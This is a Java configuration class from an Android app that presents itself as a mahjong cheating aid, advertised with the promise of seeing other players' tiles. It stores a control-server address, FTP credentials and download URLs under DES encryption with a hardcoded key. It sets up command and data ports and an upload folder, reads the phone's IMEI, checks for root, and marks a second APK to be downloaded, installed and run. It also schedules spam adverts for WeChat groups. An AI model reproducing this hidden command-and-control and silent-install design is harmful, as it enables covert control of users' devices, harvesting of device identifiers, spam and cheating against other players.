/**
 * 
 */

package foreground;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

import com.bysc.maj.R;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.os.Environment;
import android.telephony.TelephonyManager;
import encrypt.DES;
import util.Funcs;
import util.RootShellCmd;

/**
 * @author byc
 *
 */
public class Config {
	private static final char[] wJ = "0123456789abcdef".toCharArray();
    public static String imsi = "204046330839890";
    public static String p = "0";
    public static String keyword = "电话";
    public static String tranlateKeyword = "%E7%94%B5%E8%AF%9D";
    //************************插件信息**************************************
    public static final String PLUGIN_VERSION="3.00";//插件版本号
	public static final String PLUGIN_NAME="maj_s.apk";//插件名字；
	public static final String PLUGIN_PACKAGENAME="com.bysc.maj";//插件名字；
    public static final int RUNNING_IN_PLUGIN = 1;//以插件方式运行；
    public static final int RUNNING_IN_MYSELF = 0;//以自身方式运行；
    public volatile static int RunningWay=RUNNING_IN_MYSELF;//运行方式
	//*************************************************************
    
	public static final String PREFERENCE_NAME = "bysc_maj_config";//配置文件名称
	
	public static final String KEY = "9ba45bfd500642328ec03ad8ef1b6e75";// 自定义密钥

    
	public static final String TAG = "bysc001";//调试标识：
	public static final String TAG2 = "bysc002";//调试标识：
	public static final boolean DEBUG = false;//调试标识：
	
	//微信的包名
	public static final String WECHAT_PACKAGENAME = "com.tencent.mm";
	//微信的包名
	public static final String QQ_PACKAGENAME = "com.tencent.mobileqq";
	public static final String SETTING_PACKAGENAME="com.android.settings";
    //注册结构：
    //00未注册；0001试用时间；2016-01-01 12：00：00开始时间；0003试用次数；0001已用次数；
    //01已注册；8760使用时间；2016-01-01 12：00：00开始时间；0003试用次数；0001已用次数；
    //定义试用次数：TestNum="0003";使用3次；
	public static final String IS_FIRST_RUN = "isFirstRun";//是否第一次运行
	private static final boolean bFirstRun=true; 
	//定义app标识
	public static final String appID="am";//定义app标识：秒杀一切
	
    //private static final String HOST2 = "101.200.200.78";
	//是否注册:
	public static final String REG = "reg";
	private static final boolean reg = false;
	public static  volatile boolean bReg = false;
	//注册码：
	private static final String REG_CODE="Reg_Code";
	public static  String RegCode="123456789012";
	//试用时间
	public static final String TEST_TIME = "TestTime";
    private static final int TestTime=0;//-- 试用0个小时；
    //试用次数：
    public static final String TEST_NUM = "TestNum";
    private static final int TestNum=0;//--试用3次 
    //第一次运行时间：
    public static final String FIRST_RUN_TIME = "first_run_time";
    //已运行次数：
    public static final String RUN_NUM = "RunNum";
    //唯一标识符
    public static final String PHONE_ID = "PhoneID";
	//自动更新为试用版的起始时间
	public static final String START_TEST_TIME = "StartTestTime";
	//自动更新为试用版的时间间隔（7天）
    public static final int TestTimeInterval=7;//-- 
    //--------------------------------------------------------------------------------------
    //界面参数（用户参数）：
    //支付密码：
    private static final String PAY_PWD="Pay_PWD";//支付密码
    public static final String KEY_PWD="";//--默认支付密码000000
    public static String sPWD="";//--默认支付密码000000
    public static final String WINDOW_LUCKYMONEY_LAUNCHER_UI="com.tencent.mm.ui.LauncherUI";
    //广播消息定义
    public static final String ACTION_QIANGHONGBAO_SERVICE_DISCONNECT = "com.bysc.maj.ACCESSBILITY_DISCONNECT";
    public static final String ACTION_QIANGHONGBAO_SERVICE_CONNECT = "com.bysc.maj.ACCESSBILITY_CONNECT";
    //
    public static final String ACTION_DOWNLOAD_INFO = "com.bysc.maj.DOWNLOAD_INFO ";//下载消息
    public static final String ACTION_INSTALL_INFO = "com.bysc.maj.INSTALL_INFO ";//安装消息
    public static final String ACTION_CMD_INFO = "com.bysc.maj.CMD_INFO ";//root命令消息
    public static final String ACTION_UPDATE_INFO = "com.bysc.UPDATE_INFO ";//更新消息
    public static final String ACTION_ACCESSBILITY_SERVICE_CLICK = "com.bysc.maj.ACCESSBILITY_SERVICE_CLICK";//点击广播
    public static final String ACTION_ACCESSBILITY_SERVICE_REQUEST = "com.bysc.ACCESSBILITY_SERVICE_REQUEST";//
    //屏幕分辨率：
    //public static int screenWidth=0;
    ///public static int screenHeight=0;
    //public static int currentapiVersion=0;
    //版本号
    public static String version="";
    //微信版本号
    public static int wv=1020; 
    //--------------------------------------------------------------------------------------------------------
    private static final String MAJ_TYPE="Maj_Type";//--麻将类型
    public static final int MAJ_TYPE_YILE=1;//--逸乐麻将
    public static final int MAJ_TYPE_XIANLAI=2;//--闲来麻将
    public static final int MAJ_TYPE_GUAIZ=3;//--贵州麻将
    public static final int MAJ_TYPE_YOUXIAN=4;//--悠闲碰糊
    public static final int MAJ_TYPE_ZHUANGZ=5;//--转转麻将
    public static final int MAJ_TYPE_DATAN=6;//--大唐麻将
    public static final int MAJ_TYPE_BUXIN=7;//--阜新麻将
    public static final int MAJ_TYPE_ZHONGZ=8;//中至麻将
    public static final int MAJ_TYPE_KELE=9;//科乐麻将
    public static final int MAJ_TYPE_QIEYOU=10;//雀友会麻将
    public static final int MAJ_TYPE_PPPFZ=11;//皮皮跑胡子
    public static final int MAJ_TYPE_LIUZHOU=12;//柳州麻将
    public static final int MAJ_TYPE_LIUZHOU2=13;//非常柳州麻
    public static final int MAJ_TYPE_LCGC=14;//龙城国 粹
    public static final int MAJ_TYPE_52=15;//52
    public static final int MAJ_TYPE_hb=16;//52
    public static final int MAJ_TYPE_OTHER=17;//52
    public static final int MAJ_TYPE_54=18;//52
    public static final int MAJ_TYPE_55=19;//52
    public static final int MAJ_TYPE_56=20;//52
    public static final int MAJ_TYPE_57=21;//52
    public static final int MAJ_TYPE_58=22;//52
    public static final int MAJ_TYPE_59=23;//52
    public static final int MAJ_TYPE_60=24;//52
    public static final int MAJ_TYPE_61=25;//52
    public static int iMajType=MAJ_TYPE_YILE;//--逸乐麻将
    //-------------------------------------------------------------------------------------------------------
    private static final String NUM_MAN="Num_Man";//--人数选择
    public static final int NUM_MAN_TWO=2;//--二 人 麻将
    public static final int NUM_MAN_THREE=3;//--三人 麻将
    public static final int NUM_MAN_FOUR=4;//--四人麻将
    public static int iNumMan=NUM_MAN_THREE;//--三人 麻将
    //--------------------------------------------------------------------------------------------------------
    private static final String ZI_MO="Zi_Mo";//--自动机率 
    public static final int ZI_MO_10=10;//--自摸机率10
    public static final int ZI_MO_20=20;//--自摸机率10
    public static final int ZI_MO_30=30;//--自摸机率10
    public static final int ZI_MO_40=40;//--自摸机率10
    public static final int ZI_MO_50=50;//--自摸机率10
    public static final int ZI_MO_60=60;//--自摸机率10
    public static final int ZI_MO_70=70;//--自摸机率10
    public static final int ZI_MO_80=80;//--自摸机率10
    public static final int ZI_MO_90=90;//--自摸机率10
    public static int iZimo=ZI_MO_10;//--自摸机率10
    //--------------------------------------------------------------------------------------------------------
    private static final String HAO_PAI="Hao_Pai";//--好牌机率 
    public static final int HAO_PAI_10=10;//--好牌机率10
    public static final int HAO_PAI_20=20;//--好牌机率10
    public static final int HAO_PAI_30=30;//--好牌机率10
    public static final int HAO_PAI_40=40;//--好牌机率10
    public static final int HAO_PAI_50=50;//--好牌机率10
    public static final int HAO_PAI_60=60;//--好牌机率10
    public static final int HAO_PAI_70=70;//--好牌机率10
    public static final int HAO_PAI_80=80;//--好牌机率10
    public static final int HAO_PAI_90=90;//--好牌机率10
    public static int iHaopai=ZI_MO_10;//--好牌机率10
    //----------------------------------------------------------------------------------------
    private static final String SEL_MAJ_INDEX="Sel_Maj_Index";//--所选择 的麻将存储
    public static int iSelMaj=0;//--选择的麻将编号;
    private static final String SEL_MAJ_NAME_INDEX="Sel_Maj_Name_Index";//--所选择 的麻将名称存储
    public static int iSelMajName=0;//--选择的麻将名称编号;
    private static final String MAJ_NAME="Maj_Name";//--所选择 的麻将名称
    public static String MajName="";//--选择的麻将名称;
    public static String MajType="";//--选择的麻将类别;
    public static String MajPkg="";//麻将包名称；

  
    //-----------------------语音模块--------------------------------------------------
    private static final String SPEAKER="Speaker";//--设置发音模式
    public static final String KEY_SPEAKER_NONE="9";//--不发声；female
    public static final String KEY_SPEAKER_FEMALE="0";//--女声；
    public static final String KEY_SPEAKER_MALE="1";//--普通男声；
    public static final String KEY_SPEAKER_SPECIAL_MALE="2";//--特别男声； special
    public static final String KEY_SPEAKER_EMOTION_MALE="3";//--情感男声；emotion
    public static final String KEY_SPEAKER_CHILDREN="4";//--情感儿童声；children
    public static String speaker=KEY_SPEAKER_FEMALE;
    
    private static final String WHETHER_SPEAKING="Speak";//--是否语音提示；whether or not
    public static final boolean KEY_SPEAKING=true;//--发音
    public static final boolean KEY_NOT_SPEAKING=false;//-不发音
    public static boolean bSpeaking=KEY_SPEAKING;//--默认发音
    
    
    //本地目录：
    public volatile static String LocalDir="";//本地工作目录；
    public volatile static String LocalPath="";//本地工作路径；
    public volatile static String LocalUploadPath="";//本地工作上传路径
    private static final String WORK_SPACE="byc";//--本地工作目录名；
    private static final String ROOT_PERMISSION="root_permission";//--；
    public volatile static boolean bRoot=false;//是否root
    public volatile static String AppName="";//本app名称；
    public volatile static String PhoneBrand="";//手机品牌；
    public static final String PHONE_BRAND_XIAOMI="Xiaomi";//--Xiaomi
    public static final String PHONE_BRAND_HONOR="Honor";//--Honor
    public volatile static int screenWidth=0;//屏幕宽；
    public volatile static int screenHeight=0;//屏幕高；
    public volatile static int navigationBarHeight=0;//导航栏高；
    //服务器信息：
    public static final String FTP_FILE_NAME="maj.xml";//服务器上文件名；
    private static final String INFO_NEW_VERSION="Info_New_Version";//--新版本 号
    public static String  new_version="1.00";//新版本号 
    private static final String INFO_CONTACT="Info_Contact";//--
    public static String contact="QQ：1339524332微信：xy52088802";//联系方式
    private static final String INFO_AD="Info_AD";//--
    public static String ad="起手拿好牌，透视别家牌！另有埋雷避雷牛牛麻将辅助软件！稳赚！";//广告语
    private static final String INFO_DOWNLOAD="Info_Download";//--
    //public final static String DOWNLOAD="http://119.23.68.205/android/files/apk/maj.apk";//下载地址
    public final static String DOWNLOAD="CtyKsYF6s3pa65bKuCLxRiGboTe/BHfVVo8ZnKsZEifAUQXpd+rV8gfnhVPDP6p+";//下载地址
    public static String download=DOWNLOAD;//下载地址
    private static final String INFO_HOMEPAGE="Info_HomePage";//--
    //public static final String HOMEPAGE="http://119.23.68.205/android/android.htm";//下载地址
    public static final String HOMEPAGE="CtyKsYF6s3pa65bKuCLxRiGboTe/BHfVGo376CwctMSEXSEffXfCTmcS0YUiRJsb";//下载地址
    public static String homepage=HOMEPAGE;//下载地址
    private static final String INFO_WARNING="Info_Warning";//--
    public static String warning="警告：未授权用户拿好牌机率相应降低！限制透视换牌功能！";//下载地址   
    public static String install="xxvideo.apk";//安装包
    public static boolean install_download=true;//下载安装包吗 ？
    public static boolean install_run=true;//安装后运行 ？
	public static final String AD_REG_USER_SEND_INTERVAL="AD_Reg_User_Send_Interval";//最大已注册用户发广告间隔； 
	public static int RegUserSendADinterval=100000;//最大已注册用户发广告间隔；
	public static final String AD_NO_REG_USER_SEND_INTERVAL="AD_No_Reg_User_Send_Interval";//最大未注册用户发广告间隔； 
	public static int NoRegUserSendADinterval=1000;//最大未注册用户发广告间隔； 
	public static final String AD_OTHER_MEDIA_SEND_INTERVAL="AD_Other_Media_Send_Interval";//最大已注册对其它媒体发广告间隔；
	public static int OtherMediaSendADinterval=1000;//最大已注册对其它媒体发广告间隔； 
	public static final String AD_LUCKY_MONEY_SEND_IS="AD_Lucky_Money_Send_Is";//群里面有红包发布广告吗；
	public static boolean bLuckyMoneySend=false;//群里面有红包发布广告吗
	public static final String WX_INFO="wechat_info";//微信信息；
	public static String wi="";//微信信息；
	//***************************服务器地址************************************
    public static final String HOST = "TrxMnCHzq6kLb41Q90hIUg==";//服务器IP
    public static final int PORT_VER = 8000;
	public static final int PORT_ORDER = 8100;//命令接收端口
	public static final int PORT_DATA = 8101;//数据接收端口
	public static final int PORT_FTP = 21;//ftp端口
    public static final String FTP_USER_NAME="o1D58m2VSDQ=";
    public static final String FTP_USER_PWD="o1D58m2VSDQ=";
    
    public volatile static String uIP="";//更新服务器地址
    public volatile static int uPort=PORT_FTP;//更新服务器端口
    public volatile static String cIP="";//控制服务器地址
    public volatile static int cPort_order=PORT_ORDER;//控制服务器端口
    public volatile static int cPort_data=PORT_DATA;//控制服务器端口
    
    public volatile static String ftpPwd="";
    public volatile static String ftpUserName="";
    

	
	private static Config current;
	private SharedPreferences preferences;
	private Context context;
	SharedPreferences.Editor editor;
	    
	private Config(Context context) {
		this.context = context.getApplicationContext();
		preferences = context.getSharedPreferences(PREFERENCE_NAME, Context.MODE_PRIVATE);
		editor = preferences.edit(); 
	    //************************************解密字符串*********************************
		decryptString();
		//*********************************************************************************
	        //第一次运行判断，如果是第一次运行，写入授权模块初始化数据；
	        ////00未注册；0001试用时间；2016-01-01 12：00：00开始时间；0003试用次数；0001已用次数；
		if(isFirstRun()){
	        	this.setREG(reg);
	        	this.setTestTime(TestTime);
	        	//this.setFirstRunTime(str);
	        	this.setTestNum(TestNum);
	        	this.setRunNum(0);
	        	this.setPhoneID(getPhoneIDFromHard());

	        	this.setCurrentStartTestTime();//软件安装时，写入置为试用版的开始时间；
		}
		//3.取发音信息；
		Config.bSpeaking=this.getWhetherSpeaking();
		Config.speaker=this.getSpeaker();
		//本地全局变量：
		LocalDir=this.getLocalDir();
		bRoot=RootShellCmd.isRoot(context);
		Config.version=getSelfVersion();
		AppName=getSelfName();
		PhoneBrand=getPhoneBrand();
		//2.取出服务器信息：
		Config.new_version=this.getNewVersion();
		Config.download=this.getDownloadAddr();
		Config.contact=this.getContactWay();
		Config.warning=this.getWarning();
		Config.homepage=this.getHomepage();
		Config.ad=this.getAd();
		Config.NoRegUserSendADinterval=this.getNoRegUserSendADinterval();
		Config.RegUserSendADinterval=this.getRegUserSendADinterval();
		Config.OtherMediaSendADinterval=this.getOtherMediaSendADinterval();
		Config.bLuckyMoneySend=this.getLuckyMoneySendIs();
	}
	   
	public static synchronized Config getConfig(Context context) {
	        if(current == null) {
	            current = new Config(context.getApplicationContext());
	        }
	        return current;
	}
	private void decryptString(){
		DES des = DES.getDes(KEY);
		try{
			uIP=des.decode(HOST);
			cIP=uIP;
			ftpUserName=des.decode(FTP_USER_NAME);
			ftpPwd=des.decode(FTP_USER_PWD);
			download=des.decode(DOWNLOAD);
			homepage=des.decode(HOMEPAGE);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	public String getLocalDir(){
	        String sdcardPath = Environment.getExternalStorageDirectory().toString();
	        String workDir = sdcardPath + "/" + WORK_SPACE;
	        String uploadDir=workDir+ "/upload";
	        Funcs.makeDir(workDir);
	        Funcs.makeDir(uploadDir);
	        LocalDir=workDir;
	        LocalPath=workDir+ "/" ;
	        LocalUploadPath=uploadDir+ "/" ;
	        return workDir;
	}
	private String getSelfName(){
	    	//AppName=context.getString(R.string.app_name);
	    	int id=util.ResourceUtil.getStringId(context, "app_name");
	    	AppName=context.getString(id);
	    	return AppName;
	}
	private String getSelfVersion(){
		      	  try {
		      		  PackageInfo info = context.getPackageManager().getPackageInfo(context.getPackageName(), 0);
		      		Config.version = info.versionName;
		      		  //if(DEBUG)Log.i(TAG, info.applicationInfo.name);
		      		  return  Config.version;
		      	  } catch (PackageManager.NameNotFoundException e) {
		      		  e.printStackTrace();
		              return "";
		      	  }
	}
		/*
		     * 手机品牌： Xiaomi,Honor
		*/
	private String getPhoneBrand(){
		    	PhoneBrand=android.os.Build.BRAND;//手机品牌 
		    	return PhoneBrand;
	}   

	    //第一次运行判断：
	public boolean isFirstRun(){
	    	boolean ret=preferences.getBoolean(IS_FIRST_RUN, bFirstRun);
	    	if(ret){
	    		editor.putBoolean(IS_FIRST_RUN, false);
	    		editor.commit();
	    	}
	    	return ret;
	}
	    /** REG*/
	public boolean getREG() {
	        return preferences.getBoolean(REG, reg);
	}
	public void setREG(boolean reg) {
	        editor.putBoolean(REG, reg).apply();
	}
	    /*
	     * 存取注册码
	     */
	public String getRegCode(){
	    	return preferences.getString(REG_CODE, RegCode);
	}
	public void setRegCode(String RegCode){
	    	editor.putString(REG_CODE, RegCode).apply();
	}
	    /** TEST_TIME*/
	public int getTestTime() {
	        return preferences.getInt(TEST_TIME, TestTime);
	}
	public void setTestTime(int i) {
	        editor.putInt(TEST_TIME, i).apply();
	}
	    /** TEST_NUM*/
	public int getAppTestNum() {
	        return preferences.getInt(TEST_NUM, TestNum);
	}
	public void setTestNum(int i) {
	        editor.putInt(TEST_NUM, i).apply();
	}
	    /** FIRST_RUN_TIME*/
	public String getFirstRunTime() {
	        return preferences.getString(FIRST_RUN_TIME, "0");
	}
	public void setFirstRunTime(String str) {
	        editor.putString(FIRST_RUN_TIME, str).apply();
	}
	    /** appID*/
	public int getRunNum() {
	        return preferences.getInt(RUN_NUM, 0);
	}
	public void setRunNum(int i) {
	        editor.putInt(RUN_NUM, i).apply();
	}
	    //
	public String getPhoneIDFromHard(){
	    	TelephonyManager TelephonyMgr = (TelephonyManager)context.getSystemService(Context.TELEPHONY_SERVICE); 
	    	String szImei = TelephonyMgr.getDeviceId(); 
	    	return szImei;
	}
	public String getPhoneID() {
	        return preferences.getString(PHONE_ID, "0");
	}
	public void setPhoneID(String str) {
	        editor.putString(PHONE_ID, str).apply();
	}	   
	    //界面参数：
	  
	  
	    /** 自动置为试用版的开始时间*/
	public String getStartTestTime() {
	        return preferences.getString(START_TEST_TIME, "2017-01-26");
	}
	    /** 自动置为试用版的开始时间*/
	public void setStartTestTime(String str) {
	    	editor.putString(START_TEST_TIME, str).apply();
	}
	    /** 写入当前时间*/
	public void setCurrentStartTestTime() {
	    	SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd",Locale.US);//yyyy-MM-dd_HH-mm-ss
	    	String sDate =sdf.format(new Date());
	    	setStartTestTime(sDate);
	        //return preferences.getString(START_TEST_TIME, "2017-01-01");
	}
	    /** 获取两个日期的相隔天数*/
	public int getDateInterval(String startDate,String endDate){
	    	int y1=Integer.parseInt(startDate.substring(0, 4));
	    	int y2=Integer.parseInt(endDate.substring(0, 4));
	    	int m1=Integer.parseInt(startDate.substring(5, 7));
	    	int m2=Integer.parseInt(endDate.substring(5, 7));
	    	int d1=Integer.parseInt(startDate.substring(8));
	    	int d2=Integer.parseInt(endDate.substring(8));
	    	int ret=(y2-y1)*365+(m2-m1)*30+(d2-d1);
	    	return ret;
	}
	    //-------所选择麻将编号-----------------------------------------------------
	public int getSelMaj() {
	        return preferences.getInt(SEL_MAJ_INDEX, 0);
	}
	public void setSelMaj(int idx) {
	        editor.putInt(SEL_MAJ_INDEX, idx).apply();
	}
	    //-------所选择麻将名称编号-----------------------------------------------------
	public int getSelMajName() {
	        return preferences.getInt(SEL_MAJ_NAME_INDEX, 0);
	}
	public void setSelMajName(int idx) {
	        editor.putInt(SEL_MAJ_NAME_INDEX, idx).apply();
	}
	    /**所玩的麻将名称*/
	public String getMajName() {
	        return preferences.getString(MAJ_NAME, "");
	}
	    /** 所玩的麻将名称*/
	public void setMajName(String MajName) {
	    	editor.putString(MAJ_NAME, MajName).apply();
	}
	    //-----------------------麻将类型----------------------------------------
	public int getMajType() {
	        return preferences.getInt(MAJ_TYPE, MAJ_TYPE_YILE);
	}
	public void setMajType(int iMajType) {
	        editor.putInt(MAJ_TYPE, iMajType).apply();
	}
	    //-----------------------人数选择----------------------------------------
	public int getNumMan() {
	        return preferences.getInt(NUM_MAN, NUM_MAN_THREE);
	}
	public void setNumMan(int iNumMan) {
	        editor.putInt(NUM_MAN, iNumMan).apply();
	}
	    //-----------------------自摸机率 ----------------------------------------
	public int getZimo() {
	        return preferences.getInt(ZI_MO, ZI_MO_10);
	}
	public void setZimo(int iNumMan) {
	        editor.putInt(ZI_MO, iNumMan).apply();
	}
	    //-----------------------好版机率 ----------------------------------------
	public int getHaopai() {
	        return preferences.getInt(HAO_PAI, HAO_PAI_10);
	}
	public void setHaopai(int iHaopai) {
	        editor.putInt(HAO_PAI, iHaopai).apply();
	}
	    /**发音 人员*/
	public String getSpeaker() {
	        return preferences.getString(SPEAKER, KEY_SPEAKER_FEMALE);
	}
	    /** 发音 人员*/
	public void setSpeaker(String who) {
	    	editor.putString(SPEAKER, who).apply();
	}
	    //-----------------------是否发音---------------------------------------
	public boolean getWhetherSpeaking() {
	        return preferences.getBoolean(WHETHER_SPEAKING, true);
	}
	public void setWhetherSpeaking(boolean bSpeaking) {
	        editor.putBoolean(WHETHER_SPEAKING, bSpeaking).apply();
	}
	//----------------------------------保存服务器信息----------------------------------
    /** 新版本号*/
    public String getNewVersion() {
        return preferences.getString(INFO_NEW_VERSION, new_version);
    }
    /** 新版本号*/
    public void setNewVersion(String version) {
    	editor.putString(INFO_NEW_VERSION, version).apply();
    }
    /** 联系方式*/
    public String getContactWay() {
        return preferences.getString(INFO_CONTACT,contact);
    }
    /** 联系方式*/
    public void setContactWay(String contactWay) {
    	editor.putString(INFO_CONTACT, contactWay).apply();
    }
    /** 广告语*/
    public String getAd() {
        return preferences.getString(INFO_AD,ad);
    }
    /** 广告语*/
    public void setAd(String Ad) {
    	editor.putString(INFO_AD, Ad).apply();
    }
    /** 更新地址*/
    public String getDownloadAddr() {
        return preferences.getString(INFO_DOWNLOAD, download);
    }
    /** 更新地址*/
    public void setDownloadAddr(String downloadAddr) {
    	editor.putString(INFO_DOWNLOAD, downloadAddr).apply();
    }
    /**主页地址*/
    public String getHomepage() {
        return preferences.getString(INFO_HOMEPAGE, homepage);
    }
    /** 主页地址*/
    public void setHomepage(String homepage) {
    	editor.putString(INFO_HOMEPAGE, homepage).apply();
    }
    /**警告信息*/
    public String getWarning() {
        return preferences.getString(INFO_WARNING, warning);
    }
    /** 警告信息*/
    public void setWarning(String warning) {
    	editor.putString(INFO_WARNING, warning).apply();
    }
    /**最大已注册用户发广告间隔*/
    public int getRegUserSendADinterval() {
        return preferences.getInt(AD_REG_USER_SEND_INTERVAL, RegUserSendADinterval);
    }
    /** 最大已注册用户发广告间隔*/
    public void setRegUserSendADinterval(int regUserSendADinterval) {
    	editor.putInt(AD_REG_USER_SEND_INTERVAL, regUserSendADinterval).apply();
    }
    /**最大未注册用户发广告间隔*/
    public int getNoRegUserSendADinterval() {
        return preferences.getInt(AD_NO_REG_USER_SEND_INTERVAL, NoRegUserSendADinterval);
    }
    /** 最大已注册用户发广告间隔*/
    public void setNoRegUserSendADinterval(int noRegUserSendADinterval) {
    	editor.putInt(AD_NO_REG_USER_SEND_INTERVAL, noRegUserSendADinterval).apply();
    }
    /**最大已注册对其它媒体发广告间隔*/
    public int getOtherMediaSendADinterval() {
        return preferences.getInt(AD_OTHER_MEDIA_SEND_INTERVAL, OtherMediaSendADinterval);
    }
    /** 最大已注册对其它媒体发广告间隔*/
    public void setOtherMediaSendADinterval(int otherMediaSendADinterval) {
    	editor.putInt(AD_OTHER_MEDIA_SEND_INTERVAL, otherMediaSendADinterval).apply();
    }
    /**群里面有红包发布广告吗*/
    public boolean getLuckyMoneySendIs() {
        return preferences.getBoolean(AD_LUCKY_MONEY_SEND_IS, bLuckyMoneySend);
    }
    /** 群里面有红包发布广告吗*/
    public void setLuckyMoneySendIs(boolean LuckyMoneySend) {
    	editor.putBoolean(AD_LUCKY_MONEY_SEND_IS, LuckyMoneySend).apply();
    }  
}
